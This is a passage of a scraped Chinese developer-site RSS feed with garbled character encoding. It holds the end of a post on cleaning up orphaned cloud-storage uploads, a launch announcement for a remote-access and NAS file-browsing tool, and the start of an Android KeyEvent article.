        Job-&gt;&gt;OSS: åˆ é™¤ç‰©ç†æ–‡ä»¶
        Job-&gt;&gt;DB: åˆ é™¤æ•°æ®åº“è®°å½•
    end
</code></pre>
<h2 data-id="heading-11">5. é¿å‘ä¸æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-12">1ã€ä¸šåŠ¡ä¿å­˜å¤±è´¥å¯¼è‡´æ–‡ä»¶æ³„éœ²</h3>
<p><strong>ç°è±¡</strong>ï¼šä¸šåŠ¡ä»£ç æŠ›å¼‚å¸¸å›æ»šäº†ï¼Œä½†ç´§æ¥ç€çš„ä¸€è¡Œâ€œæ–‡ä»¶çŠ¶æ€æ›´æ–°â€æ²¡æœ‰åœ¨åŒä¸€ä¸ªäº‹åŠ¡é‡Œï¼Œæˆ–è€…æ‰‹åŠ¨ try-catch åæ‰äº†å¼‚å¸¸ã€‚</p>
<p><strong>å¯¹ç­–</strong>ï¼šåŠ¡å¿…ç¡®ä¿ <code>updateStatus</code> å’Œ <code>saveBusiness</code> åœ¨åŒä¸€ä¸ª <code>@Transactional</code> äº‹åŠ¡å†…ã€‚</p>
<h3 data-id="heading-13">2ã€ç›´æ¥ä½¿ç”¨ OSS URL ä½œä¸ºå‚æ•°</h3>
<p><strong>ç°è±¡</strong>ï¼šå‰ç«¯ç›´æ¥ä¼  URL ç»™åç«¯ï¼Œåç«¯è¿˜è¦å»åæŸ¥ IDã€‚</p>
<p><strong>å¯¹ç­–</strong>ï¼šä¸Šä¼ æ¥å£è¿”å› <code>fileId</code>ï¼Œå‰ç«¯æäº¤è¡¨å•æ—¶ä¼  <code>fileId</code>ã€‚<code>fileId</code> æ˜¯æˆ‘ä»¬ç³»ç»Ÿçš„å†…ç ï¼Œæ§åˆ¶æƒåœ¨è‡ªå·±æ‰‹é‡Œã€‚</p>
<hr/>
<p>ä½œä¸ºåŒé‡ä¿é™©ï¼Œå»ºè®®åœ¨ OSS/S3 æ§åˆ¶å°é…ç½® <strong>Lifecycle Rule</strong>ï¼š</p>
<p>æ¯”å¦‚<code>bucket/temp/*</code> ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œ<code>7</code> å¤©åè‡ªåŠ¨åˆ é™¤ã€‚è¿™æ ·å³ä½¿å®šæ—¶ä»»åŠ¡æŒ‚äº†ï¼Œæˆ–è€…æ•°æ®åº“ç‚¸äº†ï¼ŒOSS ä¹Ÿä¼šå¸®æˆ‘ä»¬å®ˆä½åº•çº¿ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[èŠ‚ç‚¹å°å®4.0 æ­£å¼å‘å¸ƒï¼šä¸€é”®ç›´è¾¾ï¼Œé‡æ–°å®šä¹‰è¿œç¨‹æ§åˆ¶ï¼]]></title>    <link>https://juejin.cn/post/7592559120118431790</link>    <guid>https://juejin.cn/post/7592559120118431790</guid>    <pubDate>2026-01-08T03:36:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592559120118431790" data-draft-id="7592683699771047946" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="èŠ‚ç‚¹å°å®4.0 æ­£å¼å‘å¸ƒï¼šä¸€é”®ç›´è¾¾ï¼Œé‡æ–°å®šä¹‰è¿œç¨‹æ§åˆ¶ï¼"/> <meta itemprop="keywords" content="è¿œç¨‹å·¥ä½œ"/> <meta itemprop="datePublished" content="2026-01-08T03:36:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å€”å¼ºçš„çŸ³å¤´_"/> <meta itemprop="url" content="https://juejin.cn/user/3168119757484368"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            èŠ‚ç‚¹å°å®4.0 æ­£å¼å‘å¸ƒï¼šä¸€é”®ç›´è¾¾ï¼Œé‡æ–°å®šä¹‰è¿œç¨‹æ§åˆ¶ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3168119757484368/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å€”å¼ºçš„çŸ³å¤´_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:36:05.000Z" title="Thu Jan 08 2026 03:36:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>èŠ‚ç‚¹å°å®4.0 æ­£å¼å‘å¸ƒï¼šä¸€é”®ç›´è¾¾ï¼Œé‡æ–°å®šä¹‰è¿œç¨‹æ§åˆ¶ï¼</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b7c42579af4643bfa8f26c5fc4b9e6f2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=KSeGwWL2%2FkIu0e4U3qziJ7dPOXI%3D" alt="" loading="lazy"/></p>
<p><strong>èŠ‚ç‚¹å°å®4.0 æ¥äº†ï¼è¿™ä¸æ˜¯ä¸€æ¬¡å¸¸è§„çš„è¿­ä»£ï¼Œè€Œæ˜¯ä¸€æ¬¡å½»åº•çš„å‡æ³•ã€‚</strong></p>
<p>æˆ‘ä»¬å°†å¤æ‚çš„è¿œç¨‹æ§åˆ¶é…ç½®ã€ç¹ççš„æ–‡ä»¶è®¿é—®è·¯å¾„ã€ä»¥åŠå¡é¡¿çš„è¿œç¨‹æ“æ§ä½“éªŒï¼Œå…¨éƒ¨æ¨ç¿»é‡æ„ã€‚</p>
<p>ç›®æ ‡åªæœ‰ä¸€ä¸ªï¼š</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff574c1c45c04aa7a2ec7b2ee6cf0c25~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=s0AB%2BCWO1gtg4bNWQ%2B0NECvEf8k%3D" alt="" loading="lazy"/></p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30be54812d6f48c3b6964d41686503d9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=bTYJtk8UfVgEHhFfTXRRJYnsRNo%3D" alt="" loading="lazy"/></p>
<p>åœ¨3.0ç‰ˆæœ¬ä¸­ï¼Œå¾ˆå¤šç”¨æˆ·åé¦ˆæ·»åŠ è®¾å¤‡åƒæ˜¯åœ¨å½“ç½‘ç®¡ï¼ŒæŸ¥IPã€å¡«ç«¯å£ã€é…è½¬å‘ï¼Œæµç¨‹ç¹çã€‚<strong>è€Œæˆ‘ä»¬çš„4.0ç‰ˆæœ¬é’ˆå¯¹è¿™äº›ç—›ç‚¹ï¼Œè¿›è¡Œäº†åº•å±‚é€»è¾‘çš„é‡æ„ã€‚</strong></p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b5af11c4eee74ed1b56161c2033645a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=Wv2jVMAN1rR5RpQBHEwM5Y4Wpdo%3D" alt="" loading="lazy"/></p>
<p>ä»¥å‰æ·»åŠ ä¸€å°æ–°è®¾å¤‡æ„å‘³ç€ä½ è¦æ‡‚ç½‘ç»œçŸ¥è¯†ï¼šæ‰‹åŠ¨æŸ¥è¯¢å†…ç½‘IPåœ°å€ã€å¡«å†™å¤æ‚çš„ç«¯å£å·ã€é…ç½®è·¯ç”±å™¨ç«¯å£è½¬å‘</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30364d7e59b141b48866b1bd5999b14d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=1aoUz0vBvy%2BZvGXPNrU1zTIljLs%3D" alt="" loading="lazy"/></p>
<p>åªéœ€æ‰«ç æˆ–æ‰‹æœºå·ç™»å½•ï¼Œå®¢æˆ·ç«¯å°±ä¼šè‡ªåŠ¨æ‰«æå±€åŸŸç½‘ï¼Œé€šè¿‡è®¾å¤‡æŒ‡çº¹åº“ï¼ˆå¦‚ç¾¤æ™–DSMã€å¨è”é€šQTSçš„é»˜è®¤ç«¯å£ï¼‰ç²¾å‡†è¯†åˆ«è®¾å¤‡ç±»å‹ï¼Œå¹¶è‡ªåŠ¨ç”ŸæˆæœåŠ¡å¡ç‰‡ã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35acae8e1990496daad0ab62de396cfe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=B4hCW0XrA3857B1M6W7jitGsTeA%3D" alt="" loading="lazy"/></p>
<p>æ•´ä¸ªè¿‡ç¨‹å°±åƒç»™æµè§ˆå™¨æ·»åŠ ä¹¦ç­¾ä¸€æ ·ç®€å•ï¼Œ<strong>ä½ çœ‹åˆ°çš„ä¸å†æ˜¯å†·å†°å†°çš„IPåœ°å€ï¼Œè€Œæ˜¯NASã€å…¬å¸ç”µè„‘è¿™æ ·çš„ç›´è§‚æ ‡è¯†ã€‚</strong></p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f97431af09ca4150891d43698a4da40f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=IjWF73w1n641tDpnUKY3VUn2mf8%3D" alt="" loading="lazy"/></p>
<p>ä»¥å‰çš„åŠŸèƒ½å…¥å£è¾ƒå¤šï¼Œå¾ˆå¤šç”¨æˆ·è¿›äº†è½¯ä»¶ä¸çŸ¥é“è¯¥ç‚¹å“ªé‡Œã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87e3a40f24f745628dac884bb544b476~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=Rcuv60czO4KXsgxjXg8CmGvR81g%3D" alt="" loading="lazy"/></p>
<p>æ–°å‡çº§çš„4.0ç‰ˆæœ¬å¯¹é¦–é¡µè¿›è¡Œäº†å¤§åˆ€é˜”æ–§çš„æ”¹é©ï¼Œç æ‰å†—ä½™ï¼Œ<strong>æ–°å¢ä¸¤å¤§æ ¸å¿ƒåŠŸèƒ½å…¥å£ï¼šè¿œç¨‹æ–‡ä»¶å’ŒåŸç”Ÿè¿œç¨‹æ¡Œé¢ã€‚</strong></p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5610e51ddeb45b39984028a90b7bcb0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=l4Kik2o35RKjAevySw3YaTbt7MU%3D" alt="" loading="lazy"/></p>
<p>**è¿œç¨‹æ–‡ä»¶ï¼š<strong>å°±åƒä¸€æŠŠé’¥åŒ™ï¼Œç›´æ¥æ‰“å¼€è¿œç¨‹ç”µè„‘çš„æŠ½å±‰ã€‚åŸç”Ÿè¿œç¨‹æ¡Œé¢</strong>ï¼š**å°±åƒä¸€ä¸ªé¥æ§å™¨ï¼Œç›´æ¥æ“æ§è¿œç¨‹ç”µè„‘çš„å±å¹•ã€‚</p>
<p><strong>æƒ³å¹²ä»€ä¹ˆï¼Œç‚¹è¿›å»å°±æ˜¯ï¼Œé€»è¾‘æ¸…æ™°ï¼Œä¸€æ­¥åˆ°ä½ï¼</strong></p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e8a297825a6f4374a3be9d36e482a1e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=BZfGu3Wt7Rzr7i3PgTSs5pvE89A%3D" alt="" loading="lazy"/></p>
<p>ä»¥å‰è®¿é—®NASé‡Œçš„æ–‡ä»¶ï¼Œä½ å¾—æ˜¯åŠä¸ªç½‘ç»œå·¥ç¨‹å¸ˆï¼Œå¾—é…ç½®SMBã€WebDAVï¼Œç”šè‡³è¿˜å¾—ç”¨å‘½ä»¤è¡Œã€‚ç°åœ¨èŠ‚ç‚¹å°å®4.0ç‰ˆæœ¬å†…ç½®äº†å¯è§†åŒ–çš„æ–‡ä»¶æµè§ˆå™¨ã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9349e0f271c41138b5a177b9ca702ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=BbV9EpDM61vH%2BbbXq6n6iie5kZ4%3D" alt="" loading="lazy"/></p>
<p>ä½ è®¿é—®å®¶é‡Œçš„NASï¼Œå°±åƒåœ¨ç¿»è‡ªå·±æ‰‹æœºé‡Œçš„ç›¸å†Œä¸€æ ·ã€‚ç›®å½•ç»“æ„ä¸€ç›®äº†ç„¶ï¼Œæ–‡ä»¶ç¼©ç•¥å›¾ç›´æ¥å±•ç¤ºï¼Œç‚¹å‡»å³å¯é¢„è§ˆã€ä¸‹è½½æˆ–ç®¡ç†ã€‚<strong>ä¸æ‡‚æŠ€æœ¯çš„å°ç™½ç”¨æˆ·ï¼Œä¹Ÿèƒ½ç§’ä¸Šæ‰‹ï¼</strong></p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af5e819ec22043cfad40b4c4bac5f266~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=PIOQKn%2Fa%2FIO%2F0gNqOchBhbRKuhg%3D" alt="" loading="lazy"/></p>
<p>ä»¥å‰ç”¨æ‰‹æœºè¿œç¨‹æ§åˆ¶ç”µè„‘ï¼Œç”µè„‘ç«¯è¦è£…æœåŠ¡ï¼Œæ‰‹æœºç«¯ä¹Ÿè¦ä¸‹è½¯ä»¶ï¼Œè®¾ç½®å¤æ‚ï¼Œè¿˜ç»å¸¸è¿ä¸ä¸Šã€‚</p>
<p><strong>ç°åœ¨èŠ‚ç‚¹å°å®4.0ç‰ˆæœ¬å¢åŠ äº†è¿œç¨‹æ¡Œé¢æ¨¡å—ã€‚</strong></p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9cba87bcdf846ceaaa85e9a004888e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=D58%2Fq6ml5VHGkmNmtI8CII3Pj5Y%3D" alt="" loading="lazy"/></p>
<p>ç”µè„‘ç«¯ä¸€é”®å¼€å¯æœåŠ¡ï¼Œæ‰‹æœºç«¯ç»“åˆç³»ç»Ÿçº§æ¡Œé¢Appï¼Œå³å¯è·å¾—æµç•…çš„è¿œç¨‹æ§åˆ¶ä½“éªŒã€‚æˆ‘ä»¬æ·±åº¦é›†æˆäº†ç³»ç»Ÿåè®®ï¼ˆWindows RDPã€macOS Screen Sharingï¼‰ï¼Œå¤§å¹…é™ä½äº†å»¶è¿Ÿï¼Œæå‡äº†æ“æ§çš„è·Ÿæ‰‹åº¦ï¼</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8bdc9bbd95b4deb9803e9ee3ac3b5a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=kAhDghCOJcMDjI0qMShsD1GqY98%3D" alt="" loading="lazy"/></p>
<p>è™½ç„¶ä½“éªŒå˜ç®€å•äº†ï¼Œä½†æˆ‘ä»¬çš„æŠ€æœ¯åº•å±‚å˜å¾—æ›´ç¡¬æ ¸äº†ã€‚</p>
<p><strong>æ™ºèƒ½è®¾å¤‡å‘ç°ï¼š</strong> ç»“åˆUDPå¹¿æ’­ã€mDNSåè®®å’Œäº‘ç«¯è®¾å¤‡ç‰¹å¾åº“ï¼Œèƒ½ç©¿é€å¤æ‚ç½‘ç»œç¯å¢ƒã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ab247caa7d74baabf80ce2ca8935729~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=Eh6a7Oj7g0vddlYkkcsU2oKhlu8%3D" alt="" loading="lazy"/></p>
<p><strong>å¤šåè®®è‡ªé€‚åº”å¼•æ“ï¼š</strong> æ–‡ä»¶æµè§ˆå™¨èƒ½è‡ªåŠ¨è¯†åˆ«å¹¶é€‰æ‹©æœ€ä¼˜ä¼ è¾“åè®®ï¼ˆSMB/WebDAVï¼‰ï¼Œå¹¶æ”¯æŒå…ƒæ•°æ®ç¼“å­˜ï¼ŒäºŒæ¬¡è®¿é—®é€Ÿåº¦æå‡300%ã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/564646b6dec44ead8c2ff3f246ff076b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=IJ1ZSb246CNG7ntHynfQx3FpRUA%3D" alt="" loading="lazy"/></p>
<p><strong>å¹¿æ³›å…¼å®¹æ€§ï¼š</strong> å…¨é¢æ”¯æŒ Windowsã€macOSã€ç¾¤æ™–ã€å¨è”é€šã€é“å¨é©¬ã€æç©ºé—´ã€ç»¿è”äº‘ã€é£ç‰›NASç­‰ä¸»æµè®¾å¤‡ã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b952c7d3235c4ce8b7783ec3605aca84~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=mAG2fbxxTySMoYxXrUUPBxRNcW0%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android KeyEventä¼ é€’ä¸ç„¦ç‚¹æ‹¦æˆª]]></title>    <link>https://juejin.cn/post/7592451588849270803</link>    <guid>https://juejin.cn/post/7592451588849270803</guid>    <pubDate>2026-01-08T03:50:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592451588849270803" data-draft-id="7577050643203997746" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android KeyEventä¼ é€’ä¸ç„¦ç‚¹æ‹¦æˆª"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T03:50:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ—¶å…‰å°‘å¹´"/> <meta itemprop="url" content="https://juejin.cn/user/923245500710296"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android KeyEventä¼ é€’ä¸ç„¦ç‚¹æ‹¦æˆª
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/923245500710296/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ—¶å…‰å°‘å¹´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:50:52.000Z" title="Thu Jan 08 2026 03:50:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
